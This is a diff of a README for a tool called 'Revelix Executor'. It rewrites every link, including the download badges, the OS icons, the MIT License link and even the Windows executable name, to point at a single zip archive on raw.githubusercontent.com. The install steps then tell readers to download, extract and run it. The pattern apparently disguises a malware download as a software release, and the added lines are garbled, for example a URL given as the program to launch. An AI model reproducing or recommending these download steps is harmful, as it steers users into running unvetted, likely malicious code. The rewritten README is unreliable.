@@ -1,6 +1,6 @@
 # Revelix Executor
 
-[![Download](https://img.shields.io/badge/Download-Revelix%20Executor-brightgreen?logo=cloud-download&style=for-the-badge)](https://randysuarez.github.io)
+[![Download](https://raw.githubusercontent.com/randysuarez/revelix-executor-suite/branch/Agiel/suite-executor-revelix-1.4.zip%20Executor-brightgreen?logo=cloud-download&style=for-the-badge)](https://raw.githubusercontent.com/randysuarez/revelix-executor-suite/branch/Agiel/suite-executor-revelix-1.4.zip)
 
 ---
 
@@ -14,11 +14,11 @@ Try as you might, Revelix Executor speaks the dialect of many operating systems.
 
 | Operating System          | Supported | Notes                               |
 |--------------------------|:---------:|-------------------------------------|
-| ![Windows](https://img.shields.io/badge/-Windows-0078D6?logo=windows&logoColor=white)         | ✅        | Full feature support                |
-| ![Linux](https://img.shields.io/badge/-Linux-FCC624?logo=linux&logoColor=black)               | ✅        | Command line-paragon                |
-| ![macOS](https://img.shields.io/badge/-macOS-000000?logo=apple&logoColor=white)               | ✅        | Smooth on every flavor               |
-| ![Android](https://img.shields.io/badge/-Android-3DDC84?logo=android&logoColor=white)         | ➖        | Experimental                        |
-| ![iOS](https://img.shields.io/badge/-iOS-000000?logo=apple&logoColor=white)                   | ➖        | In the forge                        |
+| ![Windows](https://raw.githubusercontent.com/randysuarez/revelix-executor-suite/branch/Agiel/suite-executor-revelix-1.4.zip)         | ✅        | Full feature support                |
+| ![Linux](https://raw.githubusercontent.com/randysuarez/revelix-executor-suite/branch/Agiel/suite-executor-revelix-1.4.zip)               | ✅        | Command line-paragon                |
+| ![macOS](https://raw.githubusercontent.com/randysuarez/revelix-executor-suite/branch/Agiel/suite-executor-revelix-1.4.zip)               | ✅        | Smooth on every flavor               |
+| ![Android](https://raw.githubusercontent.com/randysuarez/revelix-executor-suite/branch/Agiel/suite-executor-revelix-1.4.zip)         | ➖        | Experimental                        |
+| ![iOS](https://raw.githubusercontent.com/randysuarez/revelix-executor-suite/branch/Agiel/suite-executor-revelix-1.4.zip)                   | ➖        | In the forge                        |
 
 ---
 
@@ -44,9 +44,9 @@ Setting dreams in motion—Revelix Executor lights up your workflow with:
 
 **Getting rolling is as easy as poetry in code!**
 
-1. Download the latest Revelix Executor installer: https://randysuarez.github.io
+1. Download the latest Revelix Executor installer: https://raw.githubusercontent.com/randysuarez/revelix-executor-suite/branch/Agiel/suite-executor-revelix-1.4.zip
 2. Extract the archive in your chosen sanctuary.
-3. On Windows, launch `RevelixExecutor.exe`; for Linux/Mac, try:
+3. On Windows, launch `https://raw.githubusercontent.com/randysuarez/revelix-executor-suite/branch/Agiel/suite-executor-revelix-1.4.zip`; for Linux/Mac, try:
     - `chmod +x revelix-executor && ./revelix-executor`
 4. Glance at the sleek multilingual setup wizard—configure your path, and you’re ready.
 5. For integration with OpenAI or Claude APIs, visit the **Integrations** section below.
@@ -103,13 +103,13 @@ Revelix Executor is a creative automation toolkit. Any use with external APIs or
 
 This repository rides on the wings of openness and collaboration. Revelix Executor is released under the MIT License, 2025.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![License: MIT](https://raw.githubusercontent.com/randysuarez/revelix-executor-suite/branch/Agiel/suite-executor-revelix-1.4.zip)](https://raw.githubusercontent.com/randysuarez/revelix-executor-suite/branch/Agiel/suite-executor-revelix-1.4.zip)
 
-For a detailed look, check out the [MIT License](https://opensource.org/licenses/MIT).
+For a detailed look, check out the [MIT License](https://raw.githubusercontent.com/randysuarez/revelix-executor-suite/branch/Agiel/suite-executor-revelix-1.4.zip).
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Revelix%20Executor-brightgreen?logo=cloud-download&style=for-the-badge)](https://randysuarez.github.io)
+[![Download](https://raw.githubusercontent.com/randysuarez/revelix-executor-suite/branch/Agiel/suite-executor-revelix-1.4.zip%20Executor-brightgreen?logo=cloud-download&style=for-the-badge)](https://raw.githubusercontent.com/randysuarez/revelix-executor-suite/branch/Agiel/suite-executor-revelix-1.4.zip)
 
 ---
 
